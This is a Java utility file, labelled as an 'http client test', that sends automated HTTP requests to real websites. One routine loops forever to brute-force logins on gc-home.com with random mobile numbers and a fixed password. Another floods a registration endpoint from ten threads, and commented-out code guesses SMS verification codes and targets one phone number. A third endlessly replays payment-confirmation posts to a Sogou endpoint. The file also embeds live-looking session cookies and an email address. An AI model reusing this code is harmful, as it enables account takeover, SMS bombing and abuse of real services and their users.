package com.ryl.learn.util;

import org.apache.commons.lang3.RandomStringUtils;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * http client test
 * Created on 16/6/21 上午10:39.
 */
public class HttpForm {

    private static final String[] prefix = new String[]{"134", "135", "136", "137", "138", "139", "147", "150", "151", "152", "157", "158",
            "159", "182", "187", "188", "130", "131", "132", "155", "156", "185", "186", "133", "153", "180", "189"};
    private static final int len = prefix.length;

    private static AtomicInteger count = new AtomicInteger(0);

    public static void main(String[] args) throws Exception {
        ExecutorService service = Executors.newFixedThreadPool(1);
        String url = "http://wan.sogou.com/payconfirm.do?x=v";
        for (int i = 0; i < 1; i++) {
            service.submit(new PayWorker(url));
        }
    }

    public static class PayWorker implements Runnable {
        private String url;

        public PayWorker(String url) {
            this.url = url;
        }

        @Override
        public void run() {
            HttpClient client = HttpClientBuilder.create().build();
            while (true) {
                HttpPost post = new HttpPost(url + "&t=" + System.nanoTime());
                try {
                    post.addHeader("Cookie", "SUV=004F7D8DB65CFD03577C64796F108139; IPLOC=CN3301; JSESSIONID=aaapRZJZYX1LthVxv69wv; IESESSION=alive; tencentSig=5346518016; pgv_pvi=8242046976; pgv_si=s6700715008; IPLOC=CN1101; _qddab=3-ib1dbf.iqar31xl; CXID=78B03FEC87FDF83DF09FC8A6BB8480CB; toutiao_city_news=%E5%8C%97%E4%BA%AC; GOTO=; _ga=GA1.2.791106921.1467774573; ad=Clllllllll2gKAAAlllllVWVmNylllllHO8dlkllllylllllRqxlw@@@@@@@@@@@; SUID=03FD5CB65412940A00000000577CC9E4; swfLayer=1; source=0010000100000; ppinf=5|1468392780|1469602380|dHJ1c3Q6MToxfGNsaWVudGlkOjQ6MTEwMHx1bmlxbmFtZTowOnxjcnQ6MTA6MTQ2ODM5Mjc4MHxyZWZuaWNrOjA6fHVzZXJpZDoxNzplcHBlMjIyQHNvZ291LmNvbXw; pprdig=knAQ0NvSM8HJG580WqAvqDgODeB9h8MhPhXgD9IDFi9amPmtqQ0L9NmbQgZ2tPZC3a2J28U2LyLK2XdsIf27VLfuitdf567APoNvgc4qoLcVrPcrGuewlfxsdvpHzaurGG_w-lpp4EO2zp9wDo2ZgLwADqbxYRmzC4lL4zSN_0g; email=eppe222%40sogou.com; ppmdig=1468392781000000d8bc212ddbaf4c0646dad4534f0545e9; JSESSIONID=aaapRZJZYX1LthVxv69wv");
                    List<BasicNameValuePair> formParams = new ArrayList<BasicNameValuePair>();
                    formParams.add(new BasicNameValuePair("paygate", "1131"));
                    formParams.add(new BasicNameValuePair("gid", "627"));
                    formParams.add(new BasicNameValuePair("sid", "138"));
                    formParams.add(new BasicNameValuePair("amount", "10"));
                    post.setEntity(new UrlEncodedFormEntity(formParams, "UTF-8"));

                    HttpResponse response = client.execute(post);
                    System.out.println(count.incrementAndGet() + " " + Thread.currentThread().getName() + " " + EntityUtils.toString(response.getEntity()));
                    System.out.println("#################################################################################");
                } catch (IOException e) {
                    System.err.println(e);
                    e.printStackTrace();
                    break;
                }
            }
        }
    }


    public static void login() throws Exception {
        HttpPost post = new HttpPost("http://www.gc-home.com/index.php/Login/Index/login");
        post.setHeader("Accept", "*/*");
        post.setHeader("Accept-Encoding", "gzip, deflate");
        post.setHeader("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4");
        post.setHeader("Connection", "keep-alive");
        post.setHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        post.setHeader("Cookie", "PHPSESSID=ibiflhni9f04fn0vb7ia2tbou1; visid_incap_826927=56gpyh9IQ4KK7Ze/Zge7wSGfaFcAAAAAQUIPAAAAAACPoV/SFbekgYfNaSuz9XbT; incap_ses_406_826927=c0+QEQ7pyzsV4KpUdWeiBb/daFcAAAAAGCp/ITyqfD7/ODQPUubcPQ==");
        post.setHeader("Host", "www.gc-home.com");
        post.setHeader("Origin", "http://www.gc-home.com");
        post.setHeader("Referer", "http://www.gc-home.com/index.php");
        post.setHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36");
        post.setHeader("X-Requested-With", "XMLHttpRequest");

        HttpClient client = HttpClientBuilder.create().build();
        int num = 0;
        while (true) {
            String mobile = prefix[num % len] + RandomStringUtils.randomNumeric(8);
            List<BasicNameValuePair> formParams = new ArrayList<BasicNameValuePair>();
            formParams.add(new BasicNameValuePair("serialize", "username=" + mobile + "&password=123123&captcha=1234"));

            post.setEntity(new UrlEncodedFormEntity(formParams, "UTF-8"));
            HttpResponse response = client.execute(post);
            String respStr = EntityUtils.toString(response.getEntity(), "UTF-8");
            num++;
            System.out.println(num + " " + mobile + " " + respStr);
        }
    }

    public static void sendMobile() throws Exception {
        ExecutorService service = Executors.newFixedThreadPool(20);
        HttpClient client = HttpClientBuilder.create().build();
        HttpPost post = new HttpPost("http://www.gc-home.com/index.php/User/Register/get_ajax_userName");
        post.setHeader("Cookie", "PHPSESSID=ibiflhni9f04fn0vb7ia2tbou1; incap_ses_222_826927=YSGdI1rN+g0A2S7nEbUUA4/uaFcAAAAAxA9pjtgmdvYmWS/hh2A3nQ==; incap_ses_401_826927=gJdJW7/9tlCK6MCylaOQBR0AaVcAAAAAVokAy8yKJEhS+6uWVo9ILg==; visid_incap_826927=56gpyh9IQ4KK7Ze/Zge7wSGfaFcAAAAAQUIPAAAAAACPoV/SFbekgYfNaSuz9XbT; incap_ses_406_826927=b8wzOZti1wcFrPeld2eiBeoAaVcAAAAAE/gJ/TFDFjpPSL9B2niXng==");

        for (int i = 0; i < 10; i++) {
            service.submit(new SendMobileWorker(client, post, i));
        }
    }

    static class SendMobileWorker implements Runnable {

        private static AtomicInteger num = new AtomicInteger(0);
        private HttpClient client;
        private HttpPost post;
        private Integer thread;

        public SendMobileWorker(HttpClient client, HttpPost post, Integer thread) {
            this.client = client;
            this.post = post;
            this.thread = thread;
        }

        @Override
        public void run() {
            while (true) {
                try {
                    /*String mobile = prefix[num.intValue() % len] + RandomStringUtils.randomNumeric(8);

                    if (num.intValue() % 10 == 0) {
                        mobile = "15210830381";
                    }

                    String code = RandomStringUtils.randomNumeric(6);
                    List<BasicNameValuePair> formParams = new ArrayList<BasicNameValuePair>();
                    formParams.add(new BasicNameValuePair("serialize", "userMobile=" + mobile + "&IMGCode=&mobile_code=" + code + "&type=forgot"));
                    formParams.add(new BasicNameValuePair("actype", "forgot1"));

                    UrlEncodedFormEntity entity = new UrlEncodedFormEntity(formParams, "UTF-8");
                    post.setEntity(entity);*/

                    HttpResponse response = client.execute(post);
                    String result = EntityUtils.toString(response.getEntity(), "UTF-8");
                    System.out.println(Thread.currentThread().getName() + " " + num.getAndIncrement() + " " + result);

                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }
    }


}
